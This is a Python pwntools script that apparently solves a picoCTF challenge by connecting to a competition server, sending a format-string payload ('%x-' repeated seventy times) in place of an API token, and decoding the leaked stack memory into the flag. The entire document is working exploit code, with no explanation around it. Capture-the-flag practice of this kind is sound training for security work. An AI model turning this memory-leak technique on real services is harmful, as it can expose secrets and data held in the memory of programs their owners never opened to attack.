from pwn import *

r = remote('mercury.picoctf.net','20195')

r.recvuntil("View my portfolio")
r.sendline('1')
log.info("Viewing Portfolio...")
r.recvuntil("What is your API token?")
log.info("Sending String Formats...")
r.sendline('%x-' * 70)
log.info("Received data.. Parsing API Key..")
r.recvuntil('Buying stonks with token:\n')

leak = r.recvline().decode("utf-8")
leak = leak.split('-')
flag = ""
for data in leak:
	try:
		#Try to print if it's decodable from hex to ascii
		data = bytearray.fromhex(data).decode()[::-1]
		flag += data

	except:
		continue

print(flag)